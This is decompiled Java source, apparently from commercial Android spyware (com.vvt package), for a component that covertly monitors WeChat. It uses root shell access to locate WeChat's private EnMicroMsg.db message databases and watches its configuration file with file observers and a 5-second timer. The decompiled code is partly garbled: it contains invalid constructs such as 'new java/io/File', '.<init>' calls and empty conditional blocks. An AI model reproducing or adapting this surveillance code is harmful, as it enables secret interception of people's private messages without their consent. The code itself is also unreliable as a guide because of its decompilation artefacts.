package com.vvt.capture.wechat.a;

import com.vvt.base.capture.e;
import com.vvt.base.capture.i;
import com.vvt.io.j;
import com.vvt.io.m;
import com.vvt.io.p;
import com.vvt.shell.ShellUtil;
import java.io.File;
import java.util.Timer;

public class b implements e, m {
  private static final boolean a = a.a;
  private static final boolean b = a.e;
  private static String i = null;
  private i c;
  private j d;
  private d e = null;
  private com.vvt.capture.wechat.a.FxFileObserverWorker f;
  private boolean g;
  private Timer h = null;
  
  private void b(String paramString) {
    int j = 0;
    i = paramString;
    String str1 = p.a(com.vvt.capture.wechat.b.a, paramString);
    boolean bool2 = ShellUtil.b(str1);
    if (bool2)
    {
      int k = 2;
      String[] arrayOfString = new String[k];
      String str2 = "EnMicroMsg.db";
      arrayOfString[0] = str2;
      String str3 = "EnMicroMsg2.db";
      arrayOfString[1] = str3;
      int m = arrayOfString.length;
      if (j < m)
      {
        str3 = arrayOfString[j];
        str3 = p.a(str1, str3);
        File localFile = new java/io/File;
        localFile.<init>(str3);
        boolean bool3 = localFile.exists();
        if (bool3)
        {
          long l1 = localFile.length();
          long l2 = 0L;
          boolean bool4 = l1 < l2;
          if (bool4)
          {
            bool4 = a;
            if (bool4) {}
            c(str3);
          }
        }
        for (;;)
        {
          j += 1;
          break;
          boolean bool5 = a;
          if (!bool5) {}
        }
      }
    }
    else
    {
      boolean bool1 = b;
      if (!bool1) {}
    }
  }
  
  private void c(String paramString)
  {
    d locald = this.e;
    boolean bool;
    if (locald == null)
    {
      bool = a;
      if (bool) {}
      locald = new com/vvt/capture/wechat/a/d;
      locald.<init>(this, paramString);
      this.e = locald;
      locald = this.e;
      locald.startWatching();
    }
    for (;;)
    {
      return;
      bool = b;
      if (!bool) {}
    }
  }
  
  private void e()
  {
    com.vvt.capture.wechat.a.FxFileObserverWorker localg = this.f;
    boolean bool;
    if (localg == null)
    {
      bool = a;
      if (bool) {}
      localg = new com/vvt/capture/wechat/a/g;
      String str = "/data/data/com.tencent.mm/shared_prefs/system_config_prefs.xml";
      localg.<init>(this, str);
      this.f = localg;
      localg = this.f;
      localg.startWatching();
    }
    for (;;)
    {
      return;
      bool = b;
      if (!bool) {}
    }
  }
  
  private void f()
  {
    boolean bool = a;
    if (bool) {}
    Timer localTimer = this.h;
    if (localTimer == null)
    {
      localTimer = new java/util/Timer;
      localTimer.<init>();
      this.h = localTimer;
      f localf = new com/vvt/capture/wechat/a/f;
      bool = false;
      localf.<init>(this, null);
      localTimer = this.h;
      long l1 = 0L;
      long l2 = 5000L;
      localTimer.scheduleAtFixedRate(localf, l1, l2);
    }
    bool = a;
    if (bool) {}
  }
  
  private void g()
  {
    boolean bool = a;
    if (bool) {}
    Timer localTimer = this.h;
    if (localTimer != null)
    {
      this.h.cancel();
      bool = false;
      localTimer = null;
      this.h = null;
    }
    bool = a;
    if (bool) {}
  }
  
  public void a(i parami)
  {
    boolean bool = a;
    if (bool) {}
    bool = true;
    this.g = bool;
    this.c = parami;
    j localj = this.d;
    if (localj == null)
    {
      localj = j.a();
      this.d = localj;
    }
    localj = this.d;
    String str = "com.tencent.mm";
    localj.a(str, this);
    bool = a;
    if (bool) {}
  }
  
  public void a(String paramString)
  {
    boolean bool = a;
    if (bool) {}
    Object localObject = this.e;
    if (localObject != null)
    {
      localObject = this.e;
      ((d)localObject).stopWatching();
      this.e = null;
      bool = a;
      if (!bool) {}
    }
    localObject = this.f;
    if (localObject != null)
    {
      localObject = this.f;
      ((com.vvt.capture.wechat.a.FxFileObserverWorker)localObject).stopWatching();
      this.f = null;
      bool = a;
      if (!bool) {}
    }
    g();
    bool = a;
    if (bool) {}
  }
  
  public void a(String paramString1, String paramString2)
  {
    boolean bool = a;
    if (bool) {}
    bool = a;
    if (bool) {}
  }
  
  public void b()
  {
    boolean bool = a;
    if (bool) {}
    bool = false;
    this.g = false;
    Object localObject = this.e;
    if (localObject != null)
    {
      localObject = this.e;
      ((d)localObject).stopWatching();
      this.e = null;
      bool = a;
      if (!bool) {}
    }
    localObject = this.f;
    if (localObject != null)
    {
      localObject = this.f;
      ((com.vvt.capture.wechat.a.FxFileObserverWorker)localObject).stopWatching();
      this.f = null;
      bool = a;
      if (!bool) {}
    }
    g();
    localObject = this.d;
    if (localObject != null)
    {
      localObject = this.d;
      String str = "com.tencent.mm";
      ((j)localObject).a(str);
      this.d = null;
    }
    bool = a;
    if (bool) {}
  }
  
  public void b(String paramString1, String paramString2)
  {
    boolean bool1 = a;
    if (bool1) {}
    String str = com.vvt.capture.wechat.b.a();
    boolean bool2 = a;
    if (bool2) {}
    bool2 = com.vvt.ag.b.a(str);
    if (!bool2)
    {
      b(str);
      e();
    }
    for (;;)
    {
      bool1 = a;
      if (bool1) {}
      return;
      f();
    }
  }
  
  public void c(String paramString1, String paramString2) {}
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/wechat/a/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */